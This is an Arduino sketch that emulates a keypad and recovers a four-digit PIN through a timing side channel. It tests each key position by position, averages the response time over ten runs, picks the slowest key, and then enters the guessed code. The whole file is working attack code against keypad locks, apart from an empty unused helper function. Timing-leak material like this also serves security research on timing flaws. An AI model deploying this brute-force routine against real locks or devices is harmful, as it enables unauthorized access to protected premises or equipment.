#include "KeypadEmulation.h"

KeypadEmulation keypadS;

void setup() {
  // initialize the digital pin as an output.

  keypadS = KeypadEmulation();
  pinMode(PB2, INPUT_PULLUP);
  delay(1000);
  Serial.begin(9600);
}
float average(unsigned short Num1, unsigned short Num2, unsigned short Num3, unsigned short Num4)
{
  unsigned int t = 0;
  float average = 0;
  for (int j = 0; j < 10; j++)
    {
      //delayMicroseconds(10000);
      t = keypadS.inputSimulation(Num1, Num2, Num3, Num4);
      average += t;
      t = 0;
    }
    return average / 10.0;
    
}
unsigned int goodNumber()
{
  
}


// the loop routine runs over and over again forever:
void loop() {
  
  float averages[4][12] = {{0}};
  unsigned int maximum[4] = {0};
  for (int i = 0; i < 12; i++)
  {
    averages[0][i] = average(i, 1, 1, 4);
  //  Serial.println(averages[0][i]);
  }
  for (int i = 0; i < 11; i++)
  {
    if (averages[0][maximum[0]] < averages[0][i + 1]) {
      maximum[0] = i + 1;
    }
  }
  //Serial.println(maximum[0]);
  //delay(10000);
  for (int i = 0; i < 12; i++)
  {
    averages[1][i] = average(maximum[0], i, 1, 4);
    //Serial.println(averages[1][i]);
  }
  for (int i = 0; i < 11; i++)
  {
    if (averages[1][maximum[1]] < averages[1][i + 1]) {
      maximum[1] = i + 1;
    }
  }
  //Serial.println(maximum[1]);
  //delay(10000);
 for (int i = 0; i < 12; i++)
  {
    averages[2][i] = average(maximum[0], maximum[1], i, 4);
    //Serial.println(averages[2][i]);
  }
  for (int i = 0; i < 11; i++)
  {
    if (averages[2][maximum[2]] < averages[2][i + 1]) {
      maximum[2] = i + 1;
    }
  }
  //Serial.println(maximum[2]);
  //delay(10000);
  for (int i = 0; i < 12; i++)
  {
    averages[3][i] = average(maximum[0], maximum[1], maximum[2], i);
    //Serial.println(averages[3][i]);
  }
  for (int i = 0; i < 11; i++)
  {
    if (averages[3][maximum[3]] < averages[3][i + 1]) {
      maximum[3] = i + 1;
    }
  }
  //Serial.println(maximum[3]);
  keypadS.inputSimulation(maximum[0], maximum[1], maximum[2], maximum[3]);
  
  delay(60000);

  Serial.println();
}
